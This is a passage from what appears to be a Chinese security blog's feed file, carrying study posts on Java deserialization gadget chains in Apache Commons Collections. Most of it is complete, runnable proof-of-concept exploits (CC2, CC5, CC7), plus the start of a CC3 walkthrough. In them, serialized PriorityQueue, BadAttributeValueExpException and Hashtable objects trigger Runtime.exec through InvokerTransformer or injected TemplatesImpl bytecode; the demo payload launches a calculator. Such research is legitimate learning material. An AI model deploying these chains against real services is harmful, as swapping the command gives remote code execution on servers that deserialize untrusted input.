class="comment">PriorityQueue.heapify()</span></span><br><span class="line"><span class="comment">PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment">    PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment">    TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getByteCodes()&#125;);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TransformingComparator在CommonsCollections4中实现了Serializable接口，传无用值，反射修改</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        <span class="comment">// heapify()中(size &gt;&gt;&gt; 1) - 1 &gt;= 0，所以需要至少两位填充</span></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformingComparator,<span class="string">&quot;transformer&quot;</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(priorityQueue)));</span><br><span class="line">        deserialize(serialize(priorityQueue));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getByteCodes() <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);  </span><br><span class="line">    ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));  </span><br><span class="line">    ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);  </span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">        commons-collections: 3.1 - 3.2.1</span></span><br><span class="line"><span class="comment">        Jdk 8u76 without a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">            TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(badAttributeValueExpException)));</span><br><span class="line">        deserialize(serialize(badAttributeValueExpException));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">        commons-collections: 3.2.1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        Hashtable.readObject()</span></span><br><span class="line"><span class="comment">            Hashtable.reconstitutionPut()</span></span><br><span class="line"><span class="comment">                AbstractMapDecorator.equals()</span></span><br><span class="line"><span class="comment">                    AbstractMap.equals()</span></span><br><span class="line"><span class="comment">                        LazyMap.get()</span></span><br><span class="line"><span class="comment">                            ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                                ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                                InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个具有冲突的哈希LazyMap，&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">2</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(hashtable)));</span><br><span class="line">        deserialize(serialize(hashtable));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
            <tag> CommonsCollections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC3</title>
      <link href="/2023/11/20/java/cc/CC3/"/>
      <url>/2023/11/20/java/cc/CC3/</url>
      
        <content type="html"><![CDATA[<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><h4 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass()"></a>defineClass()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231120165750378.png" alt="image-20231120165750378"></p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h4 id="defineClass-1"><a href="#defineClass-1" class="headerlink" title="defineClass()"></a>defineClass()</h4><p>default，本类调用</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231120171117187.png" alt="image-20231120171117187"></p><h4 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h4><p>private，继续找</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231120171546040.png" alt="image-20231120171546040"></p><p>父类是 ABSTRACT_TRANSLET 常量就赋一个值；否则会用 put 方法，_auxClasses 为空，就会报空指针错误</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231121192358302.png" alt="image-20231121192358302"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231121193301307.png" alt="image-20231121193301307"></p><h4 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h4><p><code>newInstance()</code>，初始化后，可以动态执行代码</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231120172558290.png" alt="image-20231120172558290"></p><h4 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h4><p>public</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231120173014158.png" alt="image-20231120173014158"></p><h4 id="CC3-Test"><a href="#CC3-Test" class="headerlink" title="CC3_Test"></a>CC3_Test</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">byteCodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Compiler\\Idea\\target\\classes\\xyz\\Gadget\\CC3\\Test.class&quot;</span>));</span><br><span class="line"><span class="comment">//        byte[] code = Base64.getDecoder().decode(&quot;base64.class&quot;);</span></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        byteCodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();  <span class="comment">// test</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java 